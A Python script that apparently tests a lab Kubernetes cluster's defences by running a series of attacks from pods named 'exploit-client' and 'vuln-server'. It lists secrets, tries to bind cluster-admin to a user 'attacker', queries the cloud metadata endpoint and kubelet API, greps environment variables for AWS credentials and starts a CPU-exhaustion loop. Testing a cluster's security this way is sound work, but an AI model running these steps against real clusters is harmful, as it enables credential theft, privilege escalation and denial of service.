#!/usr/bin/env python3

import subprocess
import json
from kubernetes import client, config
from kubernetes.stream import stream

NAMESPACE = "default"

ATTACK_RESULTS = []


def log(test, status, details=""):
    ATTACK_RESULTS.append({
        "test": test,
        "status": status,
        "details": details
    })
    print(f"[{status}] {test} -> {details}")


def get_pod(name):
    v1 = client.CoreV1Api()
    pods = v1.list_namespaced_pod(NAMESPACE)

    for p in pods.items:
        if name in p.metadata.name:
            return p.metadata.name
    return None


def exec_in_pod(pod, command):
    v1 = client.CoreV1Api()

    try:
        resp = stream(
            v1.connect_get_namespaced_pod_exec,
            pod,
            NAMESPACE,
            command=["/bin/sh", "-c", command],
            stderr=True,
            stdin=False,
            stdout=True,
            tty=False,
        )
        return resp
    except Exception as e:
        return str(e)


# ----------------------------
# Attack Tests
# ----------------------------

def test_list_secrets():
    try:
        v1 = client.CoreV1Api()
        secrets = v1.list_namespaced_secret(NAMESPACE)
        log("List Kubernetes secrets", "SUCCESS",
            f"Found {len(secrets.items)} secrets")
    except Exception as e:
        log("List Kubernetes secrets", "BLOCKED", str(e))


def test_metadata_api(pod):
    output = exec_in_pod(pod, "curl -s http://169.254.169.254/latest/meta-data/ || true")

    if output.strip():
        log("Instance Metadata API access", "SUCCESS", output[:200])
    else:
        log("Instance Metadata API access", "BLOCKED", "No response")


def test_kubelet_api(pod):
    cmd = "curl -k https://127.0.0.1:10250/pods || true"
    output = exec_in_pod(pod, cmd)

    if "pod" in output.lower():
        log("Access Kubelet API", "SUCCESS", output[:200])
    else:
        log("Access Kubelet API", "BLOCKED", output[:200])


def test_data_collection(pod):
    output = exec_in_pod(pod, "ls -la / || true")

    if output:
        log("Collect data from pod", "SUCCESS", output[:200])
    else:
        log("Collect data from pod", "FAILED")


def test_cloud_credentials(pod):
    cmd = "env | grep -i aws || true"
    output = exec_in_pod(pod, cmd)

    if output.strip():
        log("Using cloud credentials", "SUCCESS", output)
    else:
        log("Using cloud credentials", "BLOCKED", "No credentials found")


def test_dos(pod):
    cmd = "yes > /dev/null &"
    exec_in_pod(pod, cmd)
    log("Denial of Service attempt", "EXECUTED", "CPU stress started")


def test_proxy_egress(pod):
    cmd = "curl -s https://example.com || true"
    output = exec_in_pod(pod, cmd)

    if output:
        log("Connect from proxy server / egress", "SUCCESS")
    else:
        log("Connect from proxy server / egress", "BLOCKED")


def test_cluster_admin_binding():
    rbac = client.RbacAuthorizationV1Api()

    body = client.V1ClusterRoleBinding(
        metadata=client.V1ObjectMeta(name="attack-test-binding"),
        role_ref=client.V1RoleRef(
            api_group="rbac.authorization.k8s.io",
            kind="ClusterRole",
            name="cluster-admin"
        ),
        subjects=[
            client.V1Subject(
                kind="User",
                name="attacker",
                api_group="rbac.authorization.k8s.io"
            )
        ]
    )

    try:
        rbac.create_cluster_role_binding(body)
        log("Cluster-admin binding", "SUCCESS")
    except Exception as e:
        log("Cluster-admin binding", "BLOCKED", str(e))


# ----------------------------
# Main
# ----------------------------

def main():

    config.load_kube_config()

    client_pod = get_pod("exploit-client")
    server_pod = get_pod("vuln-server")

    if not client_pod or not server_pod:
        print("Pods not found")
        return

    print("Target pods:")
    print("Client:", client_pod)
    print("Server:", server_pod)

    # attacks
    test_list_secrets()
    test_cluster_admin_binding()

    test_metadata_api(client_pod)
    test_kubelet_api(client_pod)
    test_cloud_credentials(client_pod)

    test_data_collection(server_pod)

    test_proxy_egress(client_pod)

    test_dos(client_pod)

    with open("attack_test_results.json", "w") as f:
        json.dump(ATTACK_RESULTS, f, indent=2)


if __name__ == "__main__":
    main()